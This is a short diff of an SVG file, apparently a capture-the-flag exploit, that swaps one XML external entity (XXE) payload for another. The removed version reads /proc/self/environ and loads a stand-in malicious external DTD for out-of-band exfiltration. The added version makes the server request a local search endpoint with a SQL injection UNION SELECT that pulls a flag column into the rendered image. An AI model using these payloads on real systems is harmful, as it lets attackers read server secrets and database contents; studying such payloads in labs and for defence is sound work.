@@ -1,11 +1,8 @@
-        <!-- xss-flag.svg -->
-        <?xml version="1.0" encoding="UTF-8"?>
-        <!DOCTYPE svg [
-            <!ENTITY % file SYSTEM "/proc/self/environ"> <!-- Read environment variables -->
-            <!ENTITY % dtd SYSTEM "RAW_URL_OF_EVIL_DTD"> <!-- Fetch external DTD -->
-            %dtd; <!-- Process external DTD -->
-        ]>
-        <svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
-            <rect width="1000" height="1000" fill="white"/>
-            <text x="10" y="50">Triggering OOB XXE...</text> <!-- Displayed text doesn't matter -->
-        </svg>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+    <!ENTITY xxe SYSTEM "http://localhost:8001/search?q=') UNION SELECT id, flag_REPLACE_WITH_RANDOM FROM _REPLACE_WITH_RANDOM; --">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
+    <rect width="1000" height="1000" fill="white"/>
+    <text x="10" y="50" font-size="12" fill="black">&xxe;</text>
+</svg>
